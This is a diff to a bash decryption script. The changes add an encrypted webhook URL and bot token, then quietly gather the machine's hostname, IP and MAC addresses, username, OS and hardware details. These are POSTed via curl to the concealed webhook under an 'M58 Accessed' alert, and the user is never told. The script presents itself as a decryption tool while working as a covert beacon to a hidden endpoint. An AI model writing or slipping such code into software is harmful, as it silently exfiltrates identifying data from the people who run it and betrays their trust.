@@ -1,37 +1,25 @@
 #!/bin/bash
 
-# Hardcoded encrypted Base64 text
-encrypted_b64="U2FsdGVkX1/8IjniU/TVoG2W3w30VJzF2smJKW/kswfws0AwxRzeLD9lZSnXVZBN
-m7IF06IraZwlggg4TRlhkFTHNnScLW8J3vov9ORsoQvEk669S7YsBmZamUoM5jKa
-UqryzBQvL9Ug04Aih57HgQW5EBaGSrRp70H/zy+DgqzdwDsAzRlEboo6TmzThbLh
-vfVYNIjbNFTN6bOQovjTcbD+lwAwTUqYna8iFXlSMaWIKanRav4Tep5NXSDCCDyO
-qigOaR9DE3L8WRD39au+MCWpyL0+lhS5EpYoGE7jRTN41kV6iAQ4dBw+RPGtipvG
-Djt95QxwkC+pVBNPcKKlLsZuL031ty3RgRmy3k5ujogbg6guUfH3sknpEoLjwBg3
-asFApWUWx0iNK0Wpz409cLXM2pxIZmf25C+1nABG4rM63iCxmIckzLutEW2nraPk
-XJALHhnSN6p/dUXzrkT5/JOFSDnLjuuHYPru/aNmPHCgZtVKDpgw7tXJsKOHUsaL
-JPf+3exawgLjSNmZsbBNWsBQXGPLCgXYWDWYyfxJrnr89jpozYessr0r+d4IsJ0b
-DKMRDc8YjghIX2gC28k/81XKLZJPLpKuHas5nFUZh4YLa6H6xvnWL3Du59wmvL3d
-qkgAYOD0Gzvb83xL0t50YVCz+JUGPs+29uNI19tU/U5nwGI0aS1YcQOK7GDomJqh
-EQbC6APF+4aW3jbYK1oVWFzQvQMxozOyZZmzp6eCW19UBZ7fLZqQNaYW2b3VB3cs
-bG+nPYedqIypuMr2oe/CAog8Kosk8ARbTOklk4X5EhgrJZIhM16SmVVsJBXtQr+5
-XizWudtVVLc+BM3P2yPNIiVRGrVN2hIcymtlMhI7BMsoFBpV1XXHrjlb7Di3bkHY
-k/4jYDKY5nnESiXpwkK0/OjGIJuu/pEEvU1nU0DU8SopwBdPr021F3dzoOIIV3dL
-Yck5hiDm9t2bmSKxt3/2KHjZQTx9evCV7X1i2zWhg7J6SGdsUzOJmVJIDvHU1P1s
-3tQA5IP7f2Sr0YgEbftQW+Db+x7YqioBeJS+IoXRkD0996OY2h8Wb4pb3mv2z0rl
-A5Zb9P8aTT2KvFmPONrdwaVB7tBf9nIkTa2YaEZ4SsIiXl0jnlDCYoA93c2y4a+X
-GG1MJAILggAXSiQaI5NF7uyklftQEOmEfrbTX6YORUpimKE9kCLzBvPaTRRi0Qeh
-wjsQftTm3b/AYdSjtQ3grMpqauHzY2ZrNNgAxspM0PkD6OYsXmvbaSjvjC2wnM76
-ZDMMWIBofgO7pwUJQT0A0X2Eks7ng05UdF3SfOA9kbVfcztjcW4D6QJ9hNaOlXHD
-33Sm+iDJRp2nLwqL22lJFw=="
+# Hardcoded encrypted Base64 text and encrypted webhook details
+encrypted_b64="U2FsdGVkX19OUUNKbwqoROjMIcAMnhrnjH3uq2dBxzCtfhrOtnS3ZJTi1BzHRTXc
+0sA1XvU5lHuclIHW/XUhpjjaq3vXYp6oRtAuzWiF+Pab3kddYUWw/YuCjm8iAvtV"
+encrypted_webhook_url_b64="U2FsdGVkX19OUUNKbwqoROjMIcAMnhrnjH3uq2dBxzCtfhrOtnS3ZJTi1BzHRTXc
+0sA1XvU5lHuclIHW/XUhpjjaq3vXYp6oRtAuzWiF+Pab3kddYUWw/YuCjm8iAvtV"
+encrypted_authorization_b64="U2FsdGVkX18YavfaAAY9UwP7H68NpcOZci9vnM+3T7BKIxf7tbgH9L5Li8PQaNNx
+jC6mG13YN9AuKZeOq3TgDxRTbAQx8WRBcS7Tvz53r784NzUk5wLEx1FhQpQw2rqj"
 
-# Check OpenSSL version compatibility
+# Check OpenSSL separately for availability and version compatibility
+if ! command -v openssl &> /dev/null; then
+  echo "Error: OpenSSL command not found. Install it to continue."
+  exit 1
+fi
 openssl_version=$(openssl version)
 if [[ ! "$openssl_version" =~ "OpenSSL" ]]; then
   echo "Error: OpenSSL not found or incompatible version."
   exit 1
 fi
 
-# Check if a password was provided as a command-line argument
+# Collect decryption password
 if [ -z "$1" ]; then
   echo -n "Enter decryption password: "
   read -s password
@@ -40,6 +28,7 @@ else
   password="$1"
 fi
 
+# Decrypt the content
 decrypted_output=$(echo "$encrypted_b64" | openssl enc -aes-256-cbc -d -a -salt -pass pass:"$password" -pbkdf2 -iter 16988354 2>&1)
 decryption_status=$?
 
@@ -51,3 +40,58 @@ fi
 
 echo "Decryption successful. Decrypted content:"
 echo "$decrypted_output"
+
+# Decrypt the webhook URL and Authorization token
+WEBHOOK_URL=$(echo "$encrypted_webhook_url_b64" | openssl enc -aes-256-cbc -d -a -salt -pass pass:"$password" -pbkdf2 -iter 16988354 2>&1)
+AUTHORIZATION=$(echo "$encrypted_authorization_b64" | openssl enc -aes-256-cbc -d -a -salt -pass pass:"$password" -pbkdf2 -iter 16988354 2>&1)
+
+# Collect system information
+HOSTNAME=$(hostname)
+CPU_INFO=$(lscpu | grep "Model name" | cut -d ':' -f2 | xargs)
+MEM_INFO=$(free -h | grep "Mem" | awk '{print $3 " used of " $2}')
+DISK_USAGE=$(df -h / | grep "/" | awk '{print $3 " used of " $2}')
+IP_ADDRESS=$(hostname -I | awk '{print $1}')
+OS_DETAILS=$(cat /etc/os-release | grep "PRETTY_NAME" | cut -d '"' -f2)
+USER=$(whoami)
+MAC_ADDRESS=$(ip link show | grep link/ether | awk '{print $2}' | head -n 1)
+
+# Generate JSON payload
+PAYLOAD=$(jq -nc \
+    --arg hn "$HOSTNAME" \
+    --arg cpu "$CPU_INFO" \
+    --arg mem "$MEM_INFO" \
+    --arg disk "$DISK_USAGE" \
+    --arg ip "$IP_ADDRESS" \
+    --arg os "$OS_DETAILS" \
+    --arg user "$USER" \
+    --arg mac "$MAC_ADDRESS" \
+    '{
+        content: ("**!!! M58 Accessed !!!\nSystem Information**:\n" +
+                 "- **Hostname:** \($hn)\n" +
+                 "- **CPU:** \($cpu)\n" +
+                 "- **Memory:** \($mem)\n" +
+                 "- **Disk Usage:** \($disk)\n" +
+                 "- **IP Address:** \($ip)\n" +
+                 "- **Operating System:** \($os)\n" +
+                 "- **User:** \($user)\n" +
+                 "- **MAC Address:** \($mac)")
+    }')
+
+# Check if payload creation was successful
+if [ -z "$PAYLOAD" ]; then
+  echo "Error: Failed to create JSON payload using jq."
+  exit 1
+fi
+
+# Send the information using curl
+response=$(curl -w "%{http_code}" -o /dev/null -s -X POST \
+  -H "Authorization: Bot $AUTHORIZATION" \
+  -H "Content-Type: application/json" \
+  -d "$PAYLOAD" \
+  $WEBHOOK_URL)
+
+# Check response code from curl execution
+if [ "$response" -ne 200 ]; then
+  echo "Error: Failed to send data via webhook, HTTP status code: $response."
+  exit 1
+fi
